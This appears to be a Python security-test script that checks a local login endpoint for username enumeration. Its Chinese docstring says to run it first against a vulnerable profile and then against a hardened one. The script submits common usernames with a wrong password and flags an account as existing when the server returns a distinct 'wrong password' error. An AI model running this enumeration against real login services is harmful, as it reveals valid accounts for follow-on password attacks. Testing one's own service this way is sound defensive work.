"""靶点 1：用户名枚举。
运行前请确保服务在 vulnerable profile 下启动（测位枚举可行）；
随后切到 hardened 重跑验证枚举完全失败。
"""
import httpx

candidates = ["admin", "root", "test", "alice", "bob",
              "guest", "user1", "demo", "administrator"]

valid = []
with httpx.Client(base_url="http://localhost:8080") as c:
    for u in candidates:
        r = c.post("/auth/login", json={"username": u, "password": "wrong"})
        try:
            body = r.json()
        except Exception:
            body = {}
        if r.status_code == 401 and body.get("error") == "\u5bc6\u7801\u9519\u8bef":
            print(f"[+] {u} \u5b58\u5728")
            valid.append(u)
        else:
            print(f"[-] {u} \u4e0d\u5b58\u5728\u6216\u88ab\u52a0\u56fa: {r.status_code} {body}")

print(f"\n\u679a\u4e3e\u51fa {len(valid)} \u4e2a\u6709\u6548\u7528\u6237\u540d: {valid}")
